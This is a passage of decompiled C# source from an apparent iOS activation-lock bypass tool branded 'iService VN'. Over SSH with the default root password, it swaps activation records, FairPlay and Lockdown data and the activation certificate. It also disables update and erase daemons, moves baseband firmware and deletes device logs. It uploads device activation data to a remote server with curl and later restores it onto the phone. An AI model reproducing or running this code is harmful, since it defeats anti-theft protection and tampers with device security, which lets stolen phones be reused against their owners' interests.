			sshClient.CreateCommand("key=$(cat /./active); mv /private/preboot/$key/usr/local/standalone/firmware/Baseband2 /private/preboot/$key/usr/local/standalone/firmware/Baseband").Execute();
			sshClient.CreateCommand("key=$(cat /./Library/Preferences/SystemConfiguration/com.apple.radios.plist); if test -z $key; then echo '' &>log; rm /log; else chflags nouchg /./Library/Preferences/SystemConfiguration/com.apple.radios.plist; plutil -AirPlaneMode -remove /./Library/Preferences/SystemConfiguration/com.apple.radios.plist; killall CommCenter; fi ").Execute();
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message, "ERROR");
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Recovered_06_007d_Name()
	{
		SshClient sshClient = new SshClient("127.0.0.1", "root", "alpine");
		try
		{
			if (!sshClient.IsConnected)
			{
				sshClient.Connect();
			}
			sshClient.CreateCommand("cp /private/preboot/active /./").Execute();
			sshClient.CreateCommand("mount -o rw,union,update /private/preboot").Execute();
			sshClient.CreateCommand("key=$(cat /./active); mv /private/preboot/$key/usr/local/standalone/firmware/Baseband /private/preboot/$key/usr/local/standalone/firmware/Baseband2").Execute();
			sshClient.CreateCommand("path=\"/System/Library/LaunchDaemons\"; launchctl unload -w -F $path*; launchctl load -w -F $path*").Execute();
			sshClient.CreateCommand("mv /usr/local/standalone/firmware/Baseband /usr/local/standalone/firmware/Baseband2");
			SshCommand sshCommand = sshClient.CreateCommand("find /private/preboot -type d -name \"Baseband\"");
			Recovered_04_0060_Name = sshCommand.Result.Replace("/standalone/firmware/Baseband", "").Replace("\n", "").Replace("//", "/");
			sshClient.CreateCommand("mount -o rw,union,update /private/preboot");
			sshClient.CreateCommand("mv " + Recovered_04_0060_Name + "/standalone/firmware/Baseband " + Recovered_04_0060_Name + "/standalone/firmware/Baseband2");
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message, "ERROR");
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Recovered_06_007e_Name()
	{
		try
		{
			Recovered_06_00c1_Name();
			ConnectSshOverUsb();
			UpdateProgress(2);
			MountDeviceFilesystem();
			UpdateProgress(3);
			string deviceProductVersion = DeviceStateRecovered.DeviceProductVersion;
			if (deviceProductVersion.Contains("12"))
			{
				Recovered_06_00b3_Name(Recovered_04_0054_Name + "/i12update", "/System/Library/PrivateFrameworks/PreferencesUI.framework/General.plist");
				Recovered_06_00b3_Name(Recovered_04_0054_Name + "/i12erase", "/System/Library/PrivateFrameworks/PreferencesUI.framework/Reset.plist");
				ExecuteSshCommand("chmod 755 /System/Library/PrivateFrameworks/PreferencesUI.framework/General.plist");
				ExecuteSshCommand("chmod 755 /System/Library/PrivateFrameworks/PreferencesUI.framework/Reset.plist");
				ExecuteSshCommand("killall -9 backboardd");
			}
			else
			{
				Recovered_06_00b3_Name(Recovered_04_0054_Name + "/i13update", "/System/Library/PrivateFrameworks/Settings/GeneralSettingsUI.framework/General.plist");
				Recovered_06_00b3_Name(Recovered_04_0054_Name + "/i13erase", "/System/Library/PrivateFrameworks/Settings/GeneralSettingsUI.framework/Reset.plist");
				ExecuteSshCommand("chmod 755 /System/Library/PrivateFrameworks/Settings/GeneralSettingsUI.framework/General.plist");
				ExecuteSshCommand("chmod 755 /System/Library/PrivateFrameworks/Settings/GeneralSettingsUI.framework/Reset.plist");
				ExecuteSshCommand("killall -9 backboardd");
			}
			ExecuteSshCommand("launchctl unload -w /System/Library/LaunchDaemons/com.apple.mobile.obliteration.plist");
			ExecuteSshCommand("launchctl unload -w /System/Library/LaunchDaemons/com.apple.OTACrashCopier.plist");
			ExecuteSshCommand("launchctl unload -w /System/Library/LaunchDaemons/com.apple.mobile.softwareupdated.plist");
			ExecuteSshCommand("launchctl unload -w /System/Library/LaunchDaemons/com.apple.OTATaskingAgent.plist");
			ExecuteSshCommand("launchctl unload -w /System/Library/LaunchDaemons/com.apple.OTATaskingAgent.plist");
			ExecuteSshCommand("mount -o rw,union,update /");
			Recovered_06_00b3_Name(Recovered_04_0054_Name + "/bebeo", "/tmp/bebeo.tar");
			Recovered_06_00b3_Name(Recovered_04_0054_Name + "/lzma", "/sbin/lzma");
			ExecuteSshCommand("chmod 755 /sbin/lzma");
			ExecuteSshCommand("lzma -d -v /tmp/bebeo.tar");
			ExecuteSshCommand("tar -C / -xvf /tmp/bebeo.tar  rm -r /tmp/bebeo.tar");
			ExecuteSshCommand("chmod 755 /usr/libexec/substrate  /usr/libexec/substrate");
			ExecuteSshCommand("chmod 755 /usr/libexec/substrated  /usr/libexec/substrated");
			ExecuteSshCommand("killall -9 backboardd");
			ExecuteSshCommand("chmod +x Library/MobileSubstrate/DynamicLibraries/MobileSafety.dylib");
			ExecuteSshCommand("chmod +x Library/MobileSubstrate/DynamicLibraries/OTADisabler.dylib");
			UpdateProgress(100);
			MessageBox.Show("Done!", "Info");
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message.ToString());
			MessageBox.Show("Error in Activation Process (3)" + ex.Message, "Error in Activation Process (3)", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Recovered_06_007f_Name()
	{
		try
		{
			Recovered_06_00c1_Name();
			Recovered_06_00c8_Name();
			UpdateProgress(2);
			ConnectSshOverUsb();
			UpdateProgress(5);
			MountDeviceFilesystem();
			UpdateProgress(10);
			string text = Recovered_06_0083_Name();
			string text2 = "http://iservicevn.com/idvbackup/" + text + ".tgz";
			if (Recovered_06_00c9_Name(text2))
			{
				UpdateProgress(100);
				MessageBox.Show("iDevice Already Backup on Server", "iService VN");
				return;
			}
			Directory.CreateDirectory(Recovered_04_0055_Name + text);
			Directory.CreateDirectory(Recovered_04_0055_Name + text + "/FairPlay/");
			Directory.CreateDirectory(Recovered_04_0055_Name + text + "/Lockdown/");
			UpdateProgress(20);
			string text3 = "";
			SshCommand sshCommand = ExecuteSshCommand("find /private/var/containers/Data/System/ -iname 'internal'");
			text3 = sshCommand.Result.Replace("Library/internal", "").Replace("\n", "").Replace("//", "/");
			UpdateProgress(30);
			Recovered_04_0043_Name.Download(text3 + "Library/internal/data_ark.plist", new FileInfo(Recovered_04_0055_Name + text + "/data_ark.plist"));
			Recovered_04_0043_Name.Download(text3 + "Library/activation_records/activation_record.plist", new FileInfo(Recovered_04_0055_Name + text + "/activation_record.plist"));
			UpdateProgress(40);
			ExecuteSshCommand("chmod 755 /var/mobile/Library/FairPlay");
			ExecuteSshCommand("rm -Rf /var/mobile/Library/FairPlay/iTunes_Control/iTunes/IC-Info.sisv");
			Recovered_06_008f_Name();
			ExecuteSshCommand("uicache --all ");
			ExecuteSshCommand("killall -9 backboardd");
			UpdateProgress(50);
			Recovered_04_0043_Name.Download("/private/var/mobile/Library/FairPlay", new DirectoryInfo(Recovered_04_0055_Name + text + "/FairPlay/"));
			Recovered_04_0043_Name.Download("/var/root/Library/Lockdown", new DirectoryInfo(Recovered_04_0055_Name + text + "/Lockdown/"));
			Recovered_04_0043_Name.Download("/private/var/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist", new FileInfo(Recovered_04_0055_Name + text + "/com.apple.commcenter.device_specific_nobackup.plist"));
			Recovered_04_0043_Name.Download("/var/mobile/Library/Preferences/com.apple.purplebuddy.plist", new FileInfo(Recovered_04_0055_Name + text + "/com.apple.purplebuddy.plist"));
			UpdateProgress(60);
			Recovered_04_0043_Name.Download("/System/Library/PrivateFrameworks/MobileActivation.framework/Support/Certificates/RaptorActivation.pem", new FileInfo(Recovered_04_0055_Name + text + "/RaptorActivation.pem"));
			UpdateProgress(65);
			string text4 = text + ".tgz";
			string text5 = Recovered_04_0054_Name + "/Backup/" + text + ".tgz";
			string text6 = Recovered_04_0055_Name + text;
			Recovered_06_00ba_Name(text6, text5, text4);
			UpdateProgress(80);
			if (Directory.Exists(Recovered_04_0055_Name))
			{
				Directory.Delete(Recovered_04_0055_Name, recursive: true);
			}
			Recovered_06_0099_Name();
			UpdateProgress(90);
			ExecuteSshCommand("rm -Rf /var/mobile/Library/FairPlay/iTunes_Control/iTunes/IC-Info.sisv");
			UpdateProgress(95);
			Recovered_06_00c8_Name();
			UpdateProgress(100);
			Recovered_02_000f_TypeName recovered_02_000f_TypeName = new Recovered_02_000f_TypeName();
			recovered_02_000f_TypeName.ShowDialog();
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message.ToString());
			MessageBox.Show("Error in Backup Process : " + ex.Message, "iService VN", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			Recovered_06_00c8_Name();
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Recovered_06_0080_Name()
	{
		try
		{
			Recovered_06_00c1_Name();
			Recovered_06_00c8_Name();
			UpdateProgress(2);
			ConnectSshOverUsb();
			UpdateProgress(5);
			MountDeviceFilesystem();
			UpdateProgress(10);
			string deviceSerialNumber = DeviceStateRecovered.DeviceSerialNumber;
			using (WebClient webClient = new WebClient())
			{
				webClient.DownloadFile("http://iservicevn.com/idvbackup/" + deviceSerialNumber + ".tgz", Recovered_04_0054_Name + "/Backup/" + deviceSerialNumber + ".tgz");
			}
			UpdateProgress(20);
			if (File.Exists(Recovered_04_0054_Name + "/Backup/" + deviceSerialNumber + ".tgz"))
			{
				if (Directory.Exists(Recovered_04_0054_Name + "/Backup/" + deviceSerialNumber))
				{
					Directory.Delete(Recovered_04_0054_Name + "/Backup/" + deviceSerialNumber, recursive: true);
				}
				string text = Recovered_04_0054_Name + "/Backup/" + deviceSerialNumber + ".tgz";
				string text2 = Recovered_04_0054_Name + "/Backup/";
				Recovered_06_00bc_Name(text, text2);
				UpdateProgress(30);
				string text3 = "";
				SshCommand sshCommand = ExecuteSshCommand("find /private/var/containers/Data/System/ -iname 'internal'");
				text3 = sshCommand.Result.Replace("Library/internal", "").Replace("\n", "").Replace("//", "/");
				UpdateProgress(40);
				ExecuteSshCommand("rm -rf /var/mobile/Media/Downloads/" + deviceSerialNumber);
				ExecuteSshCommand("rm -rf /var/mobile/Media/" + deviceSerialNumber);
				ExecuteSshCommand("mkdir /var/mobile/Media/Downloads/" + deviceSerialNumber);
				Recovered_04_0043_Name.Upload(new DirectoryInfo(Recovered_04_0054_Name + "/Backup/Command/Downloads/" + deviceSerialNumber), "/var/mobile/Media/Downloads/" + deviceSerialNumber);
				UpdateProgress(50);
				ExecuteSshCommand("mv -f /var/mobile/Media/Downloads/" + deviceSerialNumber + " /var/mobile/Media/" + deviceSerialNumber);
				ExecuteSshCommand("chown -R mobile:mobile /var/mobile/Media/" + deviceSerialNumber);
				ExecuteSshCommand("chmod -R 755 /var/mobile/Media/" + deviceSerialNumber);
				ExecuteSshCommand("chmod 644 /var/mobile/Media/" + deviceSerialNumber + "/activation_record.plist");
				ExecuteSshCommand("chmod 644 /var/mobile/Media/" + deviceSerialNumber + "/data_ark.plist");
				ExecuteSshCommand("chmod 644 /var/mobile/Media/" + deviceSerialNumber + "/com.apple.commcenter.device_specific_nobackup.plist");
				ExecuteSshCommand("killall backboardd");
				Thread.Sleep(6000);
				ExecuteSshCommand("mv -f /var/mobile/Media/" + deviceSerialNumber + "/FairPlay /var/mobile/Library/FairPlay");
				ExecuteSshCommand("chmod 755 /var/mobile/Library/FairPlay");
				UpdateProgress(55);
				ExecuteSshCommand("chflags nouchg " + text3 + "/Library/internal/data_ark.plist");
				ExecuteSshCommand("mv -f /var/mobile/Media/" + deviceSerialNumber + "/data_ark.plist " + text3 + "/Library/internal/data_ark.plist");
				ExecuteSshCommand("chmod 755 " + text3 + "/Library/internal/data_ark.plist");
				ExecuteSshCommand("chflags uchg " + text3 + "/Library/internal/data_ark.plist");
				ExecuteSshCommand("mkdir " + text3 + "/Library/activation_records");
				ExecuteSshCommand("mv -f /var/mobile/Media/" + deviceSerialNumber + "/activation_record.plist " + text3 + "/Library/activation_records/activation_record.plist");
				ExecuteSshCommand("chmod 755 " + text3 + "/Library/activation_records/activation_record.plist");
				ExecuteSshCommand("chflags uchg " + text3 + "/Library/activation_records/activation_record.plist");
				UpdateProgress(60);
				ExecuteSshCommand("chflags nouchg /var/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist");
				ExecuteSshCommand("mv -f /var/mobile/Media/" + deviceSerialNumber + "/com.apple.commcenter.device_specific_nobackup.plist /var/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist");
				ExecuteSshCommand("chown root:mobile /var/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist");
				ExecuteSshCommand("chmod 755 /var/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist");
				ExecuteSshCommand("chflags uchg /var/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist");
				ExecuteSshCommand("launchctl unload /System/Library/LaunchDaemons/com.apple.mobileactivationd.plist");
				ExecuteSshCommand("launchctl load /System/Library/LaunchDaemons/com.apple.mobileactivationd.plist");
				UpdateProgress(65);
				if (File.Exists(Recovered_04_0054_Name + "/Backup/Command/Downloads/" + deviceSerialNumber + "/RaptorActivation.pem"))
				{
					ExecuteSshCommand("mv -f /var/mobile/Media/" + deviceSerialNumber + "/RaptorActivation.pem /System/Library/PrivateFrameworks/MobileActivation.framework/Support/Certificates/RaptorActivation.pem");
				}
				else
				{
					UploadResourceViaScp(ApplicationResourcesRecovered.Recovered_17_0014_Name, "/System/Library/PrivateFrameworks/MobileActivation.framework/Support/Certificates/RaptorActivation.pem");
				}
				UpdateProgress(70);
				Recovered_06_009e_Name();
				UpdateProgress(80);
				Recovered_06_00ae_Name();
				UpdateProgress(81);
				Recovered_06_0088_Name();
				UpdateProgress(82);
				Recovered_06_008a_Name();
				UpdateProgress(84);
				Recovered_06_008c_Name();
				UpdateProgress(85);
				Recovered_06_008d_Name();
				UpdateProgress(86);
				Recovered_06_00ad_Name();
				UpdateProgress(88);
				Recovered_06_008f_Name();
				UpdateProgress(90);
				Recovered_06_00a5_Name();
				UpdateProgress(96);
				if (Directory.Exists(Environment.CurrentDirectory + "/ref/Backup/" + deviceSerialNumber))
				{
					Directory.Delete(Environment.CurrentDirectory + "/ref/Backup/" + deviceSerialNumber, recursive: true);
				}
				Recovered_06_00c8_Name();
				Recovered_06_008b_Name();
				UpdateProgress(100);
				Recovered_02_0010_TypeName recovered_02_0010_TypeName = new Recovered_02_0010_TypeName();
				recovered_02_0010_TypeName.ShowDialog();
				Process.Start("https://iservicevn.com");
			}
			else
			{
				UpdateProgress(100);
				MessageBox.Show("Your Backup Not Found on Server!", "iService VN", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}
		catch (Exception)
		{
			UpdateProgress(100);
			MessageBox.Show("iDevice ReActive Failed! Please Erase All Data and Try Again!", "iService VN", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			Recovered_06_00c1_Name();
			Recovered_06_00c8_Name();
		}
	}

	private string Recovered_06_0081_Name(string P_0)
	{
		return Encoding.UTF8.GetString(Convert.FromBase64String(P_0));
	}

	public string Recovered_06_0082_Name(string P_0, Encoding P_1)
	{
		return string.IsNullOrEmpty(P_0) ? P_0 : Convert.ToBase64String(P_1.GetBytes(P_0));
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public string Recovered_06_0083_Name()
	{
		string result = "";
		try
		{
			UploadResourceViaScp(ApplicationResourcesRecovered.Recovered_17_0005_Name, "/usr/libexec/getserial");
			ExecuteSshCommand("chmod 755 /usr/libexec/getserial");
			SshCommand sshCommand = ExecuteSshCommand("/usr/libexec/getserial");
			result = sshCommand.Result.Replace("Serial:", "").Replace(" ", "").Trim();
		}
		catch (Exception ex)
		{
			File.WriteAllText("error.txt", ex.Message + "\n" + ex.StackTrace);
		}
		return result;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public string Recovered_06_0084_Name()
	{
		string result = "";
		try
		{
			SshCommand sshCommand = ExecuteSshCommand("ioreg -l | grep IOPlatformSerialNumber --color=never");
			result = sshCommand.Result.Replace("\"", "").Replace("\t", "").Replace(" ", "")
				.Replace("|IOPlatformSerialNumber=", "")
				.Trim()
				.Remove(0, 13);
		}
		catch
		{
		}
		return result;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Recovered_06_0085_Name()
	{
		ExecuteSshCommand("mkdir -p " + Recovered_04_004b_Name + " && mkdir -p " + Recovered_04_0049_Name + " && mkdir -p " + Recovered_04_0048_Name + " && mkdir -p " + Recovered_04_004c_Name);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Recovered_06_0086_Name()
	{
		Recovered_06_0091_Name(Recovered_04_004e_Name, Recovered_04_0053_Name + "com.apple.commcenter.device_specific_nobackup.plist");
		Recovered_06_0091_Name(Recovered_04_0050_Name, Recovered_04_0053_Name + "data_ark.plist");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Recovered_06_0087_Name()
	{
		Recovered_06_0091_Name(Recovered_04_004d_Name, Recovered_04_0053_Name + "activation_record.plist");
		Recovered_06_0091_Name(Recovered_04_004e_Name, Recovered_04_0053_Name + "com.apple.commcenter.device_specific_nobackup.plist");
		Recovered_06_0091_Name(Recovered_04_0050_Name, Recovered_04_0053_Name + "data_ark.plist");
		Recovered_04_0043_Name.Download("/System/Library/PrivateFrameworks/MobileActivation.framework/Support/Certificates/RaptorActivation.pem", new FileInfo(Recovered_04_0053_Name + "/RaptorActivation.pem"));
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Recovered_06_0088_Name()
	{
		try
		{
			if (DeviceStateRecovered.DeviceProductVersion.StartsWith("13.") || DeviceStateRecovered.DeviceProductVersion.StartsWith("14."))
			{
				ExecuteSshCommand("mkdir -p /System/Library/PrivateFrameworks/Settings/GeneralSettingsUI.framework && chmod -R 777 /System/Library/PrivateFrameworks/Settings/GeneralSettingsUI.framework");
				UploadResourceViaScp(ApplicationResourcesRecovered.Recovered_17_000c_Name, "/System/Library/PrivateFrameworks/Settings/GeneralSettingsUI.framework/General.plist");
				UploadResourceViaScp(ApplicationResourcesRecovered.Recovered_17_000b_Name, "/System/Library/PrivateFrameworks/Settings/GeneralSettingsUI.framework/Reset.plist");
			}
			else
			{
				ExecuteSshCommand("mkdir -p /System/Library/PrivateFrameworks/PreferencesUI.framework && chmod -R 777 /System/Library/PrivateFrameworks/PreferencesUI.framework");
				UploadResourceViaScp(ApplicationResourcesRecovered.Recovered_17_0009_Name, "/System/Library/PrivateFrameworks/PreferencesUI.framework/General.plist");
				UploadResourceViaScp(ApplicationResourcesRecovered.Recovered_17_0008_Name, "/System/Library/PrivateFrameworks/PreferencesUI.framework/Reset.plist");
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine("Error: " + ex.Message);
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Recovered_06_0089_Name()
	{
		try
		{
			if (DeviceStateRecovered.DeviceProductVersion.StartsWith("13.") || DeviceStateRecovered.DeviceProductVersion.StartsWith("14."))
			{
				ExecuteSshCommand("mkdir -p /System/Library/PrivateFrameworks/Settings/GeneralSettingsUI.framework && chmod -R 777 /System/Library/PrivateFrameworks/Settings/GeneralSettingsUI.framework");
				UploadResourceViaScp(ApplicationResourcesRecovered.Recovered_17_000b_Name, "/System/Library/PrivateFrameworks/Settings/GeneralSettingsUI.framework/Reset.plist");
			}
			else
			{
				ExecuteSshCommand("mkdir -p /System/Library/PrivateFrameworks/PreferencesUI.framework && chmod -R 777 /System/Library/PrivateFrameworks/PreferencesUI.framework");
				UploadResourceViaScp(ApplicationResourcesRecovered.Recovered_17_0008_Name, "/System/Library/PrivateFrameworks/PreferencesUI.framework/Reset.plist");
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine("Error: " + ex.Message);
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Recovered_06_008a_Name()
	{
		try
		{
			ExecuteSshCommand("launchctl unload -w /System/Library/LaunchDaemons/com.apple.mobile.obliteration.plist && launchctl unload -w /System/Library/LaunchDaemons/com.apple.OTACrashCopier.plist && launchctl unload -w /System/Library/LaunchDaemons/com.apple.mobile.softwareupdated.plist && launchctl unload -w /System/Library/LaunchDaemons/com.apple.OTATaskingAgent.plist");
			ExecuteSshCommand("rm -rf /System/Library/LaunchDaemons/com.apple.softwareupdateservicesd.plist && rm -rf /System/Library/LaunchDaemons/com.apple.mobile.softwareupdated.plist &&  rm -rf /System/Library/LaunchDaemons/com.apple.mobile.obliteration &&  rm -rf /System/Library/LaunchDaemons/com.apple.OTATaskingAgent");
		}
		catch (Exception ex)
		{
			Console.WriteLine("Failed to Disable OTA: " + ex.Message);
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Recovered_06_008b_Name()
	{
		string text = "";
		using Process process = new Process();
		process.StartInfo.FileName = Recovered_04_0052_Name + "\\vendor\\idevicediagnostics.exe";
		process.StartInfo.Arguments = "restart";
		process.StartInfo.UseShellExecute = false;
		process.StartInfo.RedirectStandardOutput = true;
		process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo.CreateNoWindow = true;
		process.Start();
		text = process.StandardOutput.ReadToEnd();
		process.WaitForExit();
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Recovered_06_008c_Name()
	{
		ExecuteSshCommand("rm -rf /private/var/mobile/Library/Logs/* > /dev/null 2>&1");
		ExecuteSshCommand("rm -rf /private/var/mobile/Library/Logs/* > /dev/null 2>&1");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void Recovered_06_008d_Name()
	{
		UploadResourceViaScp(ApplicationResourcesRecovered.Recovered_17_0013_Name, "/var/mobile/Library/Preferences/com.apple.purplebuddy.plist");
		ExecuteSshCommand("chmod 600 /var/mobile/Library/Preferences/com.apple.purplebuddy.plist");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Recovered_06_008e_Name()
	{
		try
		{
			List<string> list = null;
			string result = ExecuteSshCommand("ls /System/Library/PrivateFrameworks/SystemStatusServer.framework").Result;
			list = result.Split('\n').ToList();
			foreach (string item in list)
			{
				if (item.Contains("lproj"))
				{
					UploadResourceViaScp(ApplicationResourcesRecovered.Recovered_17_0018_Name, "/System/Library/PrivateFrameworks/SystemStatusServer.framework/" + item + "/SystemStatusServer.strings");
				}
			}
			ExecuteSshCommand("chmod 755 /System/Library/PrivateFrameworks/SystemStatusServer.framework");
		}
		catch
		{
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Recovered_06_008f_Name()
	{
		UploadResourceViaScp(ApplicationResourcesRecovered.Recovered_17_000e_Name, "/usr/bin/ldrestart");
		if (!Recovered_04_0042_Name.IsConnected)
		{
			Recovered_04_0042_Name.ConnectionInfo.Timeout = TimeSpan.FromSeconds(15.0);
			Recovered_04_0042_Name.Connect();
		}
		try
		{
			Recovered_04_0042_Name.CreateCommand("chmod 755 /usr/bin/ldrestart && /usr/bin/ldrestart").Execute();
			Recovered_04_0042_Name.Disconnect();
		}
		catch (Exception)
		{
			if (File.Exists("%USERPROFILE%\\.ssh\\known_hosts"))
			{
				File.Delete("%USERPROFILE%\\.ssh\\known_hosts");
			}
		}
		Thread.Sleep(11000);
		ConnectSshOverUsb();
		Thread.Sleep(1000);
		MountDeviceFilesystem();
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void UpdateProgress(int P_0, string P_1 = "")
	{
		MainFormRecovered Recovered_04_006d_Name = (MainFormRecovered)Application.OpenForms["MainForm"];
		Recovered_04_006d_Name.Invoke((MethodInvoker)delegate
		{
			Recovered_04_006d_Name.Recovered_06_00fc_Name(P_0, P_0.ToString());
		});
		if (P_1 == "")
		{
			P_0.ToString();
		}
		else
		{
			P_1 = P_0 + " >>> " + P_1;
		}
		Console.WriteLine(P_1);
	}

	public void Recovered_06_0091_Name(string P_0 = "", string P_1 = "")
	{
		Stream stream = File.Create(P_1);
		Stream stream2 = stream;
		try
		{
			Recovered_04_0043_Name.Download(P_0, stream2);
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
			throw;
		}
		stream2.Close();
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void EnsureDevicePairing()
	{
		while (!Recovered_06_0093_Name("pair"))
		{
			MessageBox.Show("Unlock Your iDevice and press Trust", "iService VN", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public bool Recovered_06_0093_Name(string P_0)
	{
		string currentDirectory = Directory.GetCurrentDirectory();
		try
		{
			Process process = ((!(P_0 == "pair")) ? new Process
			{
				StartInfo = new ProcessStartInfo
				{
					FileName = currentDirectory + "\\vendor\\idevicepair.exe",
					Arguments = "validate",
					UseShellExecute = false,
					RedirectStandardOutput = true,
					CreateNoWindow = true
				}
			} : new Process
			{
				StartInfo = new ProcessStartInfo
				{
					FileName = currentDirectory + "\\vendor\\idevicepair.exe",
					Arguments = "pair",
					UseShellExecute = false,
					RedirectStandardOutput = true,
					CreateNoWindow = true
				}
			});
			try
			{
				process.Start();
				StreamReader standardOutput = process.StandardOutput;
				string text = standardOutput.ReadToEnd();
				Thread.Sleep(2000);
				try
				{
					process.Kill();
				}
				catch
				{
				}
				if (text.Contains("SUCCESS"))
				{
					standardOutput.Dispose();
					return true;
				}
				return false;
			}
			catch
			{
			}
		}
		catch (Win32Exception)
		{
			MessageBox.Show("Idevicepair not found");
			return false;
		}
		return false;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Recovered_06_0094_Name()
	{
		Recovered_06_0095_Name();
		try
		{
			Process process = new Process
			{
				StartInfo = new ProcessStartInfo
				{
					FileName = Recovered_04_0052_Name + "\\vendor\\iproxy.exe",
					Arguments = Recovered_04_0046_Name + " 44",
					UseShellExecute = false,
					RedirectStandardOutput = true,
					CreateNoWindow = true
				}
			};
			process.Start();
		}
		catch (Win32Exception)
		{
			MessageBox.Show("iproxy not found");
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Recovered_06_0095_Name()
	{
		Process[] processesByName = Process.GetProcessesByName("iproxy");
		foreach (Process process in processesByName)
		{
			process.Kill();
		}
		if (File.Exists("%USERPROFILE%\\.ssh\\known_hosts"))
		{
			File.Delete("%USERPROFILE%\\.ssh\\known_hosts");
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Recovered_06_0096_Name()
	{
		SshCommand sshCommand = ExecuteSshCommand("find /private/var/containers/Data/System/ -iname 'internal'");
		Recovered_04_0047_Name = sshCommand.Result.Replace("Library/internal", "").Replace("\n", "").Replace("//", "/");
		Recovered_04_0048_Name = Recovered_04_0047_Name + "Library/internal/";
		Recovered_04_0049_Name = Recovered_04_0047_Name + "Library/activation_records/";
		Recovered_04_004a_Name = "/var/mobile/Library/Preferences/";
		Recovered_04_004b_Name = "/var/wireless/Library/Preferences/";
		Recovered_04_004c_Name = "/var/root/Library/Lockdown/";
		Recovered_04_0050_Name = Recovered_04_0048_Name + "data_ark.plist";
		Recovered_04_004d_Name = Recovered_04_0049_Name + "activation_record.plist";
		Recovered_04_0051_Name = Recovered_04_004a_Name + "com.apple.purplebuddy.plist";
		Recovered_04_004e_Name = Recovered_04_004b_Name + "com.apple.commcenter.device_specific_nobackup.plist";
		Recovered_04_004f_Name = Recovered_04_004c_Name + "data_ark.plist";
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public bool Recovered_06_0097_Name()
	{
		string text = Recovered_06_00a8_Name();
		string text2 = "";
		using (Process process = new Process())
		{
			process.StartInfo.FileName = Recovered_04_0052_Name + "\\vendor\\ideviceactivation.exe";
			process.StartInfo.Arguments = "activate -s " + text;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.RedirectStandardOutput = true;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.StartInfo.CreateNoWindow = true;
			process.Start();
			text2 = process.StandardOutput.ReadToEnd();
			process.WaitForExit();
		}
		string text3 = "";
		using (Process process2 = new Process())
		{
			process2.StartInfo.FileName = Recovered_04_0052_Name + "\\vendor\\ideviceactivation.exe";
			process2.StartInfo.Arguments = "state";
			process2.StartInfo.UseShellExecute = false;
			process2.StartInfo.RedirectStandardOutput = true;
			process2.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process2.StartInfo.CreateNoWindow = true;
			process2.Start();
			text3 = process2.StandardOutput.ReadToEnd();
			process2.WaitForExit();
		}
		if (text3.Contains("Activated"))
		{
			return true;
		}
		return false;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Recovered_06_0098_Name()
	{
		using Process process = new Process();
		process.StartInfo.FileName = Recovered_04_0052_Name + "\\vendor\\ideviceactivation.exe";
		process.StartInfo.Arguments = "activate";
		process.StartInfo.UseShellExecute = false;
		process.StartInfo.RedirectStandardOutput = true;
		process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo.CreateNoWindow = true;
		process.Start();
		process.StandardOutput.ReadToEnd();
		process.WaitForExit();
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Recovered_06_0099_Name()
	{
		string text = Recovered_06_0083_Name();
		string text2 = Recovered_06_00a9_Name();
		string text3 = text + ".tgz";
		using Process process = new Process();
		process.StartInfo.FileName = Recovered_04_0052_Name + "\\vendor\\curl.exe";
		process.StartInfo.WorkingDirectory = Recovered_04_0052_Name + "\\vendor\\Backup";
		process.StartInfo.Arguments = "curl -F upload=@" + text3 + " " + text2;
		process.StartInfo.UseShellExecute = false;
		process.StartInfo.RedirectStandardOutput = true;
		process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo.CreateNoWindow = true;
		process.Start();
		process.StandardOutput.ReadToEnd();
		process.WaitForExit();
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Recovered_06_009a_Name()
	{
